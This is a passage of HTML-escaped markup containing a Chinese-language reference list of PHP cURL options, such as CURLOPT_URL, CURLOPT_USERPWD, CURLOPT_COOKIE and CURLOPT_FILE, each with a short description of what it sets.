style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;设置一个长整形数，控制传送多少字节。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_LOW_SPEED_TIME: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;设置一个长整形数，控制多少秒传送&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;CURLOPT_LOW_SPEED_LIMIT&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;规定的字节数。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_RESUME_FROM: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个包含字节偏移地址的长整形参数，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;你想转移到的开始表单&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_SSLVERSION: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个包含&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;SSL&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;版本的长参数。默认&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;将被它自己努力的确定，在更多的安全中你必须手工设置。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_TIMECONDITION: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个长参数，指定怎么处理&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;CURLOPT_TIMEVALUE&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;参数。你可以设置这个参数为&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;TIMECOND_IFMODSINCE &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;或&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt; TIMECOND_ISUNMODSINCE&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;。这仅用于&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_TIMEVALUE: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个从&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;1970-1-1&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;开始到现在的秒数。这个时间将被&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;CURLOPT_TIMEVALUE&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;选项作为指定值使用，或被默认&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;TIMECOND_IFMODSINCE&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;使用。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;下列选项的值将被作为字符串：&lt;/span&gt;&lt;span class=&quot;apple-converted-space&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;　&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_URL: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;这是你想用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;取回的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;URL&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;地址。你也可以在用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;curl_init()&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;函数初始化时设置这个选项。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_USERPWD: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个形如&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;[username]:[password]&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;风格的字符串&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;作用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;去连接。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_PROXYUSERPWD: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个形如&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;[username]:[password]&lt;span class=&quot;apple-converted-space&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;ttag&quot;&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;格式&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;的字符串去连接&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;代理。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_RANGE: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个你想指定的范围。它应该是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;''X-Y''&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;格式，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;X&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;或&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;Y&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;是被除外的。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传送同样支持几个间隔，用逗句来分隔&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;(X-Y,N-M)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_POSTFIELDS: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个作为&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP “POST”&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;操作的所有&lt;span class=&quot;ttag&quot;&gt;数据&lt;/span&gt;的字符串。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_REFERER: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;在&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;请求中包含一个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;''referer''&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;头的字符串。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_USERAGENT: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;在&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;请求中包含一个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;''user-agent''&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;头的字符串。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_FTPPORT: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个包含被&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;ftp ''POST''&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;指令使用的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;IP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;地址。这个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;POST&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;指令告诉远程服务器去连接我们指定的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;IP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;地址。&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;这个字符串可以是一个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;IP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;地址，一个主机名，一个网络界面名&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;在&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;UNIX&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;下&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;，或是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;‘-’(&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;使用系统默认&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;IP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;地址&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_COOKIE: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个包含&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP cookie&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;的头连接。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_SSLCERT: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个包含&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PEM&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;格式证书的字符串。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_SSLCERTPASSWD: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个包含使用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;CURLOPT_SSLCERT&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;证书必需的密码。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_COOKIEFILE: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传递一个包含&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;cookie&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;数据的文件的名字的字符串。这个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;cookie&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;文件可以是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;Netscape&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;格式，或是堆存在文件中的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;风格的头。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_CUSTOMREQUEST: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;当进行&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;请求时，传递一个字符被&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;GET&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;或&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HEAD&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;使用。为进行&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;DELETE&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;或其它操作是有益的，更&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;Pass a string to beused instead of GET or HEAD when doing an HTTP request. This is useful fordoing or another, more obscure, HTTP request.&lt;span class=&quot;apple-converted-space&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;注意&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;在确认你的服务器支持命令先不要去这样做。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;下列的选项要求一个文件描述&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;通过使用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;fopen()&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;函数获得&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;：&lt;/span&gt;&lt;span class=&quot;apple-converted-space&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;　&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_FILE: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;这个文件将是你放置传送的输出文件，默认是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;STDOUT.&lt;br /&gt;\r\nCURLOPT_INFILE: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;这个文件是你传送过来的输入文件。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; 